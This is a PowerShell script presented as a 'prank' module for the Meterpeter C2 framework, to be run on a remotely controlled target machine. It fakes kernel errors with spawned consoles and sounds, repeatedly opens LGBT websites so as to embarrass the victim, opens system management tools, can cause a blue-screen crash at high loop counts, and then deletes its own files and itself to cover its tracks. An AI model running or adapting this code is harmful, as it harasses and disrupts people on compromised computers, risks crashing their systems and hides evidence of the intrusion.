<#
.SYNOPSIS
   Powershell Fake BSOD Prank

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: IWR, Media.SoundPlayer {native}
   Optional Dependencies: Critical.wav {auto-download}
   PS cmdlet Dev version: v1.2.11

.DESCRIPTION
   Auxiliary module of Meterpeter C2 v2.10.12 that executes a prank in background.
   The prank consists in spawning diferent Gay websites on target default browser,
   spawn cmd terminal consoles pretending to be a kernel error while executing an
   sfx sound effect. It also spawns windows diskmgmt.msc, firewall.cpl, appwiz.cpl
   programs and changes desktop wallpaper if invoked -BSODWallpaper 'true' param.

.NOTES
   Invoking -maxinteractions greater than '200' will probably trigger BSOD.
   If not declared -wavefile 'file.wav' then cmdlet downloads the main sfx
   sound effect to be played in background loop. If declared then cmdlet uses
   file.wav as main sfx sound effect. However the Parameter declaration only
   accepts file.wav formats ( SoundPlayer File Format Restriction )   
   
.Parameter MaxInteractions
   How many times to loop (default: 20)

.Parameter DelayTime
   The delay time between each loop (default: 20)

.Parameter WaveFile
   Accepts the main sfx effect file (default: Critical.wav)

.Parameter PreventBSOD
   Prevent the prank from BSOD target? (default: true)

.Parameter BSODWallpaper
   Change target desktop wallpaper? (default: false)
  
.EXAMPLE
   PS C:\> .\C2Prank.ps1
   Loops for 20 times max

.EXAMPLE
   PS C:\> .\C2Prank.ps1 -MaxInteractions '8'
   Loops for 8 times max with 20 seconds delay

.EXAMPLE
   PS C:\> .\C2Prank.ps1 -DelayTime '2'
   Loops for 20 times max with 2 seconds delay

.EXAMPLE
   PS C:\> .\C2Prank.ps1 -delaytime '60' -wavefile 'alert.wav'
   Loops for 20 times with 60 seconds of delay + alert.wav as sfx

.EXAMPLE
   PS C:\> .\C2Prank.ps1 -MaxInteractions '8' -BSODWallpaper 'true'
   Loops for 8 times max and changes the desktop wallpaper on exit.

.INPUTS
   None. You cannot pipe objects into C2Prank.ps1

.OUTPUTS
   * Powershell Fake BSOD Prank
     => Download 'Critical error' sfx sound effect
   * maxinteractions: 20 with: 30 (seconds)
   * Modify desktop wallpaper to BSOD wallpaper
     => Download BSOD wallpaper from my github repo
     => Add TypeDefinition and set wallpaper automatic
   * created: RevertWallpaper.ps1 in current directory
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://gist.github.com/r00t-3xp10it/95fc2ba7190c4a362a28b2266dcda0e1?permalink_comment_id=4135669#gistcomment-4135669
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$WaveFile="Critical.wav", #Main sfx sound effect
   [string]$BSODwallpaper="false",   #Change desktop wallpaper?
   [string]$PreventBSOD="true",      #Prevent the prank from BSOD?
   [int]$MaxInteractions='20',       #How many times to loop jump?
   [int]$DelayTime='20'              #Delay time between loops? (seconds)
)


#Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
$PlayWav = New-Object System.Media.SoundPlayer
[int]$FinalSfx = $MaxInteractions -1 #Set the last interaction!
write-host "* Powershell Fake BSOD Prank" -ForegroundColor Green
$LasLink = "https://www.travelgay.pt/destination/gay-portugal/gay-lisbon"
$UrlLink = "https://www.travelgay.com/destination/gay-portugal/gay-lisbon"
$UriLink = "https://theculturetrip.com/europe/portugal/lisbon/articles/the-top-10-lgbt-clubs-and-bars-in-lisbon"


#Download sound sfx files from my github repository
If($WaveFile -ieq "Critical.wav" -or $WaveFile -iNotMatch '(.wav)$')
{
   If($WaveFile -iNotMatch '(.wav)$')
   {
      $WaveFile = "Critical.wav"
      write-host "x" -ForegroundColor Red -NoNewline;
      write-host " error: Cmdlet only accepts .wav formats .." -ForegroundColor DarkGray
      write-host "  => Using default cmdlet sfx sound effect .." -ForegroundColor DarkYellow
      Start-Sleep -Seconds 1
   }

   #Download 'Critical error' windows sound effect
   write-host "  => Download 'Critical error' sfx sound effect" -ForegroundColor DarkYellow
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/Critical.wav" -outfile "Critical.wav"|Unblock-File
}


If($PreventBSOD -ieq "true")
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Prevent prank from BSOD target host

   .NOTES
      BSOD allways depends of target system RAM\CPU cicles.
   #>

   If($MaxInteractions -gt 200)
   {
      $DelayTime = "10"
      [int]$MaxInteractions = 100
      write-host "x" -ForegroundColor Red -NoNewline;
      write-host " error: current -maxinteractions parameter will cause BSOD .." -ForegroundColor DarkGray
      write-host "  => Defaulting -maxinteractions arg to '$MaxInteractions' interactions .." -ForegroundColor DarkYellow
   }
}


#lOOP Function
write-host "* maxinteractions: $MaxInteractions with: $DelayTime (seconds)" -ForegroundColor Green
For($i=1; $i -lt $MaxInteractions; $i++)
{
   #Delay time before playing sfx
   Start-Sleep -Seconds $DelayTime

   If($i -Match '^(1|3|5|7|9|11|13|15|17|19|21|23|25|27|29|30|40|50|60|70|80|90|97|98|99|100)$')
   {
      #Open Gay website on default browser and play sfx sound
      Start-Process -WindowStyle Maximized "$UrlLink"|Out-Null
      $PlayWav.SoundLocation = "$WaveFile"
      $PlayWav.playsync();
   }
   ElseIf($i -Match '^(2|4|6|8|10|12|14|16|18|20|22|24|26|28|30|40|50|60|70|80|90|97|98|99|100)$')
   {
      #Open Gay website on default browser and play sfx sound
      Start-Process -WindowStyle Maximized "$UriLink"|Out-Null
      $PlayWav.SoundLocation = "$WaveFile"
      $PlayWav.playsync();         
   }
   ElseIf($i -Match '^(7|9|12|15|18|21|24|27|30|40|43|47|50|60|62|64|68|70|80|90|97|98|99|100)$')
   {
      #Open Gay website on default browser and play sfx sound
      Start-Process -WindowStyle Maximized "$LasLink"|Out-Null
      $PlayWav.SoundLocation = "$WaveFile"
      $PlayWav.playsync();         
   }

   $MsgBoxTitle = "KERNEL WARNNING 00xf340d0.421"
   $MsgBoxText = "Kernel: Critical Error 00xf340d0.421 Memory Corruption!"
   #Spawn cmd terminal console and make it look like one kernel error as ocurr
   Start-Process cmd.exe -argumentlist "/c color 90&title $MsgBoxTitle&echo $MsgBoxText&Pause"

   If($i -Match '^(3|7|12|13|15|16|18|20|23|27|30|32|33|40|50|60|70|80|90|97|98|99|100)$')
   {
      #Open drive manager
      Start-Process diskmgmt.msc
   }
   ElseIf($i -Match '^(5|9|14|17|18|19|20|21|25|29|30|40|50|60|70|80|90|97|98|99|100)$')
   {
      #Open firewall manager
      Start-Process firewall.cpl
   }
   ElseIf($i -Match '^(6|8|9|11|13|15|17|19|20|22|23|24|30|40|50|60|70|80|90|97|98|99|100)$')
   {
      #Open programs manager
      Start-Process appwiz.cpl
   }
   ElseIf($i -Match "^($FinalSfx)$")
   {
      #Play final sfx sound {Critical error}
      $PlayWav.SoundLocation = "$WaveFile"
      $PlayWav.playsync();
   }

}


Start-Sleep -Seconds 1
#Clean artifacts left behind
Remove-Item -Path "$WaveFile" -Force

#Spawn alert message box at loop completed
powershell (New-Object -ComObject Wscript.Shell).Popup("$MsgBoxText",0,"$MsgBoxTitle",0+64)|Out-Null


$setwallpapersrc = @"
using System.Runtime.InteropServices;

public class Wallpaper
{
  public const int SetDesktopWallpaper = 20;
  public const int UpdateIniFile = 0x01;
  public const int SendWinIniChange = 0x02;
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
  public static void SetWallpaper(string path)
  {
    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
  }
}
"@

#BlueScreenOfDeath - Prank


#Auto Delete this cmdlet in the end ...
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force